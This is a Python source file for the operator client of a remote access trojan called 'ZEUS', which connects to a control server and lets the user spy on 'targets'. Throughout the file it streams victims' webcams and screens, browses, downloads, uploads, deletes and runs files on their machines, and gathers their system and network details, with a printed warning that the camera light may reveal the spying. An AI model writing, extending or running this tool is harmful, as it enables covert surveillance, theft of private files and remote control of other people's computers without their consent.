print("""
███████╗███████╗██╗   ██╗███████╗
╚══███╔╝██╔════╝██║   ██║██╔════╝
  ███╔╝ █████╗  ██║   ██║███████╗
 ███╔╝  ██╔══╝  ██║   ██║╚════██║
███████╗███████╗╚██████╔╝███████║
╚══════╝╚══════╝ ╚═════╝ ╚══════╝
                                 
""")


import time
import pickle
import cv2
import struct
import socket
import os
import sys
import time
from colorama import init, Fore, Back
import json
import tkinter as tk
from PIL import ImageTk, Image
import mss
import numpy as np

init(convert=True)

print(Fore.LIGHTYELLOW_EX + '[START] Initialising software.' + Fore.RESET)



HEADERLENGTH = 10

settings = open('settings.json', 'r')
d = json.load(settings)

NAME = d[0]['Name']
ID = d[0]['ID']
DOWNLOAD_LOC = d[0]['ID']
IP = d[0]['ServerIP']
PORT = d[0]['Port']

settings.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print(Fore.LIGHTYELLOW_EX + '[CONNECTION] Attempting to connect to the server.' +Fore.RESET)

try:
    s.connect((IP,PORT))
except:
    print(Fore.RED +'[START] Couldnt connect.' + Fore.RESET)
    while True:
        1+1

s.send(bytes(f'HACKER|{NAME}|{ID}','utf-8'))
print(Fore.LIGHTYELLOW_EX +'[CONNECTION] Connected to the server.' + Fore.RESET)
time.sleep(1)

def get_targets():
    full_msg = b''
    new_msg = True

    s.send(bytes('GET_TARGETS','utf-8'))

    while True:
        msg = s.recv(16)

        if new_msg:
            msg_len = int(msg[:HEADERLENGTH])
            new_msg = False

        full_msg += msg
        
        if len(full_msg)-HEADERLENGTH == msg_len:
            d = pickle.loads(full_msg[HEADERLENGTH:])
            new_msg = True
            full_msg = b''

            break
    
    data = ""
    for i in range(0, len(d)):
        data += f"""
Name: {d[i]["Name"]}
ID: {d[i]["ID"]}
IP: {d[i]["IP"]}

        """
    return data

def get_online_targets():
    s.send(bytes('GET_ONLINE_TARGETS','utf-8'))
    data = s.recv(1024*5).decode('utf-8')

    if data == 'NO_ONLINE_TARGETS':
        print(Fore.GREEN + "No targets are currently online. Check again later." + Fore.RESET)
        return ''
    
    return data

def get_camera_footage(id):
    s.send(bytes('GET_CAMERA_FOOTAGE','utf-8'))
    time.sleep(1)

    s.send(bytes(f'{id}','utf-8'))

    confirm = s.recv(47).decode('utf-8')

    if confirm == 'TARGET_OFFLINE':
        print(Fore.RED + '[COMMAND] Requested target is offline.' + Fore.RESET)
        return False

    data = b''

    print(Fore.GREEN + '[COMMAND] Receiving camera footage.' + Fore.RESET)
    print(Fore.LIGHTYELLOW_EX +'[COMMAND] Do not close this window directly. Press "ESC" in the newly opened window to close.' + Fore.RESET)
    print(Fore.LIGHTYELLOW_EX +'[COMMAND] If the window goes into not responding, it could mean that the target has disconnected\nRelaunch the client in that case :)' + Fore.RESET)

    while True:
        frame_size = s.recv(8)
        frame_size = struct.unpack('Q', frame_size)[0]

        data = b''
        while len(data) < frame_size:
            packet = s.recv(min(frame_size - len(data), 1024*1024*16*2))
            data += packet
            
        frame = pickle.loads(data)
        frame = np.array(frame)

        cv2.imshow('Video Footage', frame)

        if cv2.waitKey(1) & 0xFF == ord('\x1b'):
            s.send(bytes('N'.encode()))
            cv2.destroyAllWindows()
            break

        s.send(bytes('Y'.encode()))
        
    print(Fore.GREEN + '[COMMAND] Finished Receiving camera footage.' + Fore.RESET)


def get_screen_capture(id):
    s.send(bytes('GET_SCREEN_CAPTURE','utf-8'))
    time.sleep(1)

    s.send(bytes(f'{id}','utf-8'))

    confirm = s.recv(47).decode('utf-8')

    if confirm == 'TARGET_OFFLINE':
        print(Fore.RED + '[COMMAND] Requested target is offline.' + Fore.RESET)
        return False

    print(Fore.GREEN + '[COMMAND] Receiving screen capture.'+ Fore.RESET)
    print(Fore.LIGHTYELLOW_EX +'[COMMAND] Do not close this window directly. Press "ESC" in the newly opened window to close.' + Fore.RESET)
    print(Fore.LIGHTYELLOW_EX +'[COMMAND] If the window goes into not responding, it could mean that the target has disconnected\nRelaunch the client in that case :)' + Fore.RESET)

    while True:
        ss_size = s.recv(8)
        ss_size = struct.unpack('Q', ss_size)[0]

        data = b''
        while len(data) < ss_size:
            packet = s.recv(min(ss_size - len(data), 1024*1024*32))
            data += packet
            
        ss = pickle.loads(data)

        image_array = cv2.imdecode(np.frombuffer(ss.getvalue(), np.uint8), cv2.IMREAD_COLOR) 

        cv2.imshow(f'Screen Capture', image_array)
        cv2.resizeWindow("Screen Capture", 1920,1080) 

        if cv2.waitKey(1) & 0xFF == ord('\x1b'):
            s.send(bytes('N'.encode()))
            cv2.destroyAllWindows()
            break

        s.send(bytes('Y'.encode()))
        

    print(Fore.GREEN + '[COMMAND] Finished Receiving screen capture.' + Fore.RESET)



def get_files(id, dir): # get byte size
    s.send(bytes('GET_FILES','utf-8'))
    time.sleep(1)

    s.send(bytes(f'{id}','utf-8'))

    confirm = s.recv(47).decode('utf-8')

    if confirm == 'TARGET_OFFLINE':
        print(Fore.RED + '[COMMAND] Requested target is offline.' + Fore.RESET)
        return False

    s.send(bytes(dir,'utf-8'))

    data = s.recv(1024*10)
    data = pickle.loads(data)

    try:
        if data['invalid'] == 'invalid':
            return None
    except:    
        return data
    

def download_file(id, dir, loc):
    if loc == 'None' or loc == '':
        loc = DOWNLOAD_LOC

    filename = os.path.basename(dir)

    try:
        f = open(f'{loc}\\{filename}', 'wb')
        f.close()
    except:
        print(Fore.RED + '[COMMAND] Invalid file path.' + Fore.RESET)
        return
    
    s.send(bytes('DOWNLOAD_FILE','utf-8'))
    time.sleep(1)

    s.send(bytes(f'{id}','utf-8'))

    confirm = s.recv(47).decode('utf-8')

    if confirm == 'TARGET_OFFLINE':
        return False
    
    s.send(bytes(dir, 'utf-8'))

    confirm = s.recv(100).decode('utf-8')

    if confirm == 'INVALID':
        return 'None'
    
    f = open(f'{loc}\\{filename}', 'wb')
    
    file_size = s.recv(1024).decode('utf-8')
    
    data = s.recv(int(file_size))
    
    f.write(data)
    f.close()


def upload(id, file_path, download_path):
    try:
        f = open(file_path, 'rb')
    except:
        print(Fore.RED + "[COMMAND] Invalid file path." + Fore.RESET)
        return False
    
    f.close()

    s.send(bytes('UPLOAD','utf-8'))
    time.sleep(1)

    s.send(bytes(f'{id}','utf-8'))
    
    confirm = s.recv(47).decode('utf-8')

    if confirm == 'TARGET_OFFLINE':
        print(Fore.RED + '[COMMAND] Target offline.' + Fore.RESET)
        return 'OFFLINE'
    
    file_name = os.path.basename(file_path)
    
    s.send(bytes(f'{file_name}|{download_path}','utf-8'))

    confirm == s.recv(100)

    if confirm == 'INVALID':
        print(Fore.RED + '[COMMAND] Invalid download path.' + Fore.RESET)
        return 'INVALID'
    
    file_size = os.path.getsize(file_path)
    s.send(bytes(f"{file_size}",'utf-8'))

    f = open(file_path, 'rb')
    data = f.read()
    f.close()

    time.sleep(2)

    s.sendall(data)
    
    print(Fore.GREEN + '[COMMAND] Uploaded file successfully.' + Fore.RESET)


def delete(id, file_path):    
    s.send(bytes('DELETE','utf-8'))
    time.sleep(1)

    s.send(bytes(f'{id}','utf-8'))

    confirm = s.recv(47).decode('utf-8')

    if confirm == 'TARGET_OFFLINE':
        print(Fore.RED + '[LOG] Target is offline.' + Fore.RESET)
        return
    
    s.send(bytes(file_path, 'utf-8'))

    confirm = s.recv(100).decode('utf-8')

    if confirm == 'INVALID':
        print(Fore.RED + '[COMMAND] File doesnt exist.' + Fore.RESET)
        return 'None'
    
    print(Fore.GREEN + '[COMMAND] Successfully deleted the file.' + Fore.RESET)

def run(id, file):
    s.send(bytes('RUN','utf-8'))
    time.sleep(1)

    s.send(bytes(f'{id}','utf-8'))

    confirm = s.recv(47).decode('utf-8')

    if confirm == 'TARGET_OFFLINE':
        return False
    
    s.send(bytes(file, 'utf-8'))

    confirm = s.recv(100).decode('utf-8')

    if confirm == 'INVALID':
        return 'None'
    
    else:
        return True


def get_target_details(id):
    s.send(bytes('GET_TARGET_DETAILS','utf-8'))
    time.sleep(1)

    s.send(bytes(f'{id}','utf-8'))

    confirm = s.recv(47).decode('utf-8')

    if confirm == 'TARGET_OFFLINE':
        print(Fore.RED + '[LOG] Target is offline.' + Fore.RESET)
        return
    
    size = s.recv(100).decode('utf-8')

    details = s.recv(int(size))
    details = pickle.loads(details)

    msg = f"""
System Information:
    System: {details[0]['System Information']["System"]}
    Users: {details[0]['System Information']["Users"]}
    Node Name: {details[0]['System Information']["Node Name"]}
    Release: {details[0]['System Information']["Release"]}
    Version: {details[0]['System Information']["Version"]}
    Machine: {details[0]['System Information']["Machine"]}
    Ip-Address: {details[0]['System Information']["Ip-Address"]}
    Mac-Address: {details[0]['System Information']["Mac-Address"]}

Boot Time: {details[1]['Boot Time']['Boot Time:']}

Memory:
    Total Physical Memory: {details[2]['Memory']['Total Physical Memory']}
    Swap Memory: {details[2]['Memory']['Swap Memory']}

Storage:
    Total Size: {details[3]['Storage']['Total Size']}
    Used: {details[3]['Storage']['Used']}
    Free: {details[3]['Storage']['Free']}

Network:
    Public IP: {details[4]['Network']['Public IP']}    
""" 
    
    print(msg)

    print(Fore.GREEN + '[COMMAND] Successfully fetched details.' + Fore.RESET)




print("""

""")

options = """
Available options:                    Command Name:

Show this list                     : 'options'
Get a list of all targets          : 'get_targets'
Get a list of all online Targets   : 'get_online_targets'
Get target details                 : 'get_target_details'
Watch Camera Footage               : 'get_camera_footage'
Watch Screen Footage               : 'get_screen_capture'
Access file manager                : 'file_manager'


"""
print(Fore.MAGENTA + options + Fore.RESET) 

try:
    while True:
        print()

        command = input("Enter command> ")

        if command == 'options':
            print(Fore.MAGENTA + options + Fore.RESET) 

        elif command == 'get_targets':
            print(get_targets())

        elif command == 'get_online_targets':
            print(Fore.GREEN + "Current online targets are:" + Fore.RESET)
            print(get_online_targets())

        elif command == 'get_camera_footage':
            print(Fore.RED + "WARNING: This command can alert the target that they are being spied on by turning on the camera light if they are a laptop user or by showing that their camera is in use in tray.This is very RISKY. Use at own risk!\nSuggestion: Use the command 'get_target_details' to check whether they are a laptop or a desktop user." +Fore.RESET)
            confirm = input("Proceed? (y/n)> " )
            print()

            if confirm == 'y':
                try:
                    id = int(input("Enter target ID> "))
                except:
                    print(Fore.RED + "[COMMAND] Invalid target ID." + Fore.RESET)
                    continue

                get_camera_footage(id)

            else:
                print('[COMMAND] Cancelled request.')


        elif command == 'get_screen_capture':
            try:
                id = int(input("Enter target ID> "))
            except:
                print(Fore.RED + "[COMMAND] Invalid target ID." + Fore.RESET)
                continue

            get_screen_capture(id)

        elif command == 'file_manager':
            try:
                id = int(input("Enter target ID> "))
                print()

            except:
                print(Fore.RED + "[COMMAND] Invalid target ID." + Fore.RESET)
                continue

            print(Fore.LIGHTYELLOW_EX + "[COMMAND] You have now switched to file manager.\n- To close file manager, use the command 'close'\n- To change directory, simply type the directory you want to go to.\n- To see files, use the command 'list'\n- To Download Files, use the command 'download'\n- To run a file use the command, 'run'\n- To upload a file use the command, 'upload'\n- To delete a file use the command, 'delete'" + Fore.RESET)
            
            f = get_files(id, 'None')

            if f == False:
                continue

            elif f == None:
                print(Fore.RED + "[COMMAND] Invalid directory. Hint: use a full directory to cd." + Fore.RESET)
            
            directory = f['dir']

            while True:
                print(Fore.CYAN + '')
                cmmd = input(f"{directory}> ")
                

                if cmmd == 'run':
                    print(Fore.LIGHTYELLOW_EX + '')
                    file_path = input('Enter file path> ')
                    output = run(id, file_path)

                    if output == False:
                        print(Fore.RED + '[COMMAND] Target is offline.' + Fore.RESET)
                        break

                    if output == 'None':
                        print(Fore.RED + '[COMMAND] File doesnt exist.' + Fore.RESET)
                        continue

                    else:
                        print(Fore.GREEN + '[COMMAND] Successfully ran/running the file.' + Fore.RESET)
                        continue
                    
                print()

                if cmmd == 'list':
                    files = get_files(id, directory)

                    files = f"""
Folders:   
{files['folders']}    

Files  :   
{files['files']}                    
                    """
                    print(Fore.GREEN + files)

                    continue

                if cmmd == 'close':
                    print(Fore.GREEN + '[COMMAND] Closed file manager.' + Fore.RESET)
                    break

                files = get_files(id, cmmd)

                if cmmd == 'delete':
                    print(Fore.LIGHTYELLOW_EX + '')

                    file_path = input('Enter file path> ')

                    print(Fore.RED + 'CAUTION: This will permanently delete the file on the target\'s machine.' + Fore.RESET)

                    confirm = input('Are you sure you want to continue (y/n): ')

                    if confirm == 'n':
                        print(Fore.GREEN + 'Cancelled Request.')

                    delete(id, file_path)

                    continue

                if cmmd == 'download':
                    print(Fore.LIGHTYELLOW_EX + '')

                    file_path = input('Enter file path> ')
                    download_path = input('Enter download path> ')

                    print(Fore.GREEN + '[COMMAND] Downloading file.' + Fore.RESET)
                    down = download_file(id, file_path, download_path)

                    if down == False:
                        print(Fore.RED + '[COMMAND] Target is offline.' + Fore.RESET)
                        break
                    
                    elif down == 'None':
                        print(Fore.RED + '[COMMAND] File doesnt exist.' + Fore.RESET)
                        

                    elif down == 'INVALID':
                        print(Fore.RED + '[COMMAND] You have provided an invalid download path.' + Fore.RESET)

                    else:
                        print(Fore.GREEN + '[COMMAND] Downloaded file.' + Fore.RESET)
                    
                    continue

                if cmmd == 'upload':
                    print(Fore.LIGHTYELLOW_EX + '')

                    file_path = input('Enter file path> ')
                    download_path = input('Enter download path> ')

                    print(Fore.GREEN + '[COMMAND] Uploading file.' + Fore.RESET)
                    up = upload(id, file_path, download_path)

                    continue

                

                if files == False:
                    break

                if files == None:
                    print(Fore.RED + "[COMMAND] Invalid directory.")
                    continue
                
                else:
                    print(Fore.GREEN + f'[COMMAND] Switched to {files["dir"]}')
                    directory = files['dir']

        
        elif command == 'get_target_details':
            try:
                id = int(input("Enter target ID> "))
                print()

                print(Fore.GREEN + '[COMMAND] Fetching target details. This may take a moment.' + Fore.RESET)
                
                print()

            except:
                print(Fore.RED + "[COMMAND] Invalid target ID." + Fore.RESET)
                continue

            get_target_details(id)

        else:
            print(Fore.RED + "[COMMAND] Invalid command." + Fore.RESET)



except ConnectionResetError:
    print(Fore.RED + "[CONNECTION] You got disconnected from the server. Relaunch the client to reconnect." + Fore.RESET)
    while True:
        pass